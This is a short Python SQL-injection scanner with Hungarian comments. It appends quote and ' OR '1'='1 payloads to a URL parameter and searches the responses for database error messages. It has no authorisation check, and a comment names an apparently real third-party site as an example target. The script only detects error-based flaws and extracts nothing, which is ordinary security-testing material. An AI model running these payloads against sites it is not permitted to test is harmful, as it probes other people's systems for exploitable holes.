import requests
import sys

# Színek
RED = "\033[91m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
RESET = "\033[0m"

# Ezeket a jeleket próbáljuk beszúrni, hogy hibát okozzunk
PAYLOADS = ["'", "\"", "' OR '1'='1", "\" OR \"1\"=\"1"]

# Ezek a hibák jelzik, hogy az oldal sebezhető (MySQL, PostgreSQL, stb.)
SQL_ERRORS = [
    "You have an error in your SQL syntax;",
    "Warning: mysql_fetch_array()",
    "Warning: mysql_query()",
    "Unclosed quotation mark after the character string",
    "quoted string not properly terminated",
    "SQLSTATE[42000]: Syntax error"
]

def scan_url(url):
    print(f"\n[*] Vizsgálat indítása: {url}")
    print("------------------------------------------------")
    
    # Megnézzük, van-e paraméter az URL-ben (pl. ?id=1)
    if "=" not in url:
        print(f"{YELLOW}[!] Figyelem: Az URL nem tartalmaz paramétert (pl. ?id=1).")
        print("    Így nehéz tesztelni az SQL Injection-t.{RESET}")
        return

    is_vulnerable = False

    for payload in PAYLOADS:
        # Összerakjuk a támadó URL-t (pl. mikronika.hu/cikk.php?id=1')
        # Ez a módszer egyszerűen hozzáfűzi a jelet a végére
        target_url = f"{url}{payload}"
        
        print(f"[*] Tesztelés: {payload} ... ", end="")
        
        try:
            # Lekérjük az oldalt
            response = requests.get(target_url, timeout=5, headers={"User-Agent": "Mozilla/5.0"})
            body = response.text
            
            # Keressük a hibákat a HTML kódban
            found_error = False
            for error in SQL_ERRORS:
                if error in body:
                    found_error = True
                    break
            
            if found_error:
                print(f"{RED}SEBEZHETŐ! 🚨{RESET}")
                print(f"    └── Hibaüzenet az oldalon: '{error}'")
                print(f"    └── Link: {target_url}")
                is_vulnerable = True
                # Ha találtunk egyet, általában nem kell tovább keresni
                break 
            else:
                print(f"{GREEN}OK{RESET}")
                
        except requests.exceptions.RequestException as e:
            print(f"{YELLOW}Hiba a lekérésnél (Timeout/Connection){RESET}")

    print("------------------------------------------------")
    if is_vulnerable:
        print(f"{RED}[!] A weboldal valószínűleg SQL Injection hibát tartalmaz!{RESET}")
    else:
        print(f"{GREEN}[+] Nem találtunk nyilvánvaló SQL hibát (Error-based detection).{RESET}")

if __name__ == "__main__":
    print("--- 💉 SIMPLE SQL INJECTION SCANNER ---")
    url_input = input("Add meg a teljes URL-t paraméterrel (pl. http://testphp.vulnweb.com/artists.php?artist=1): ").strip()
    
    scan_url(url_input)